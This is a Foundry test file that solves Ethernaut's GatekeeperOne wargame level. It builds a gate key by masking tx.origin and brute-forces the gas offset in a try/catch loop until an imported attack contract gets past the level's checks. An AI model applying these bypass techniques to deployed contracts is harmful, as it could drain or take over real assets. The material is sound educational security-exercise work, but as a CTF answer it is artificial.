// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import 'ds-test/test.sol';
import 'forge-std/Vm.sol';

import '../levels/13-GatekeeperOne/GatekeeperOneAttack.sol';
import '../levels/13-GatekeeperOne/GatekeeperOneFactory.sol';
import '../core/Ethernaut.sol';

contract GatekeeperOneTest is DSTest {
    Vm vm = Vm(address(HEVM_ADDRESS));
    Ethernaut ethernaut;

    function setUp() public {
        ethernaut = new Ethernaut(); // initiate Ethernaut contract instance
    }

    function testGatekeeperOneAttack() public {
        //--------------------------------------------------------------------------------
        //                             Setup Level Instance
        //--------------------------------------------------------------------------------

        GatekeeperOneFactory gatekeeperOneFactory = new GatekeeperOneFactory();
        ethernaut.registerLevel(gatekeeperOneFactory);
        vm.startPrank(tx.origin);
        address levelAddress = ethernaut.createLevelInstance(gatekeeperOneFactory);
        GatekeeperOne ethernautGatekeeperOne = GatekeeperOne(payable(levelAddress));

        //--------------------------------------------------------------------------------
        //                             Start Level Attack
        //--------------------------------------------------------------------------------

        // Create GatekeeperOneAttack contract
        GatekeeperOneAttack gatekeeperOneAttack = new GatekeeperOneAttack(levelAddress);

        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        // View emitted values and compare them to the requires in Gatekeeper One
        emit log_named_uint('Gate 3 all requires', uint32(uint64(key)));
        emit log_named_uint('Gate 3 first require', uint16(uint64(key)));
        emit log_named_uint('Gate 3 second require', uint64(key));
        emit log_named_uint('Gate 3 third require', uint16(uint160(tx.origin)));

        // Loop through a until correct gas is found, use try catch to get around the revert
        for (uint256 i = 0; i <= 8191; i++) {
            // 73985 is preset close to the result for readability when testing
            // in practice we can take a wider margin
            try gatekeeperOneAttack.attack(key, 73985 + i) {
                emit log_named_uint('Pass - Gas', 73985 + i);
                break;
            } catch {}
        }

        //--------------------------------------------------------------------------------
        //                                Submit Level
        //--------------------------------------------------------------------------------

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
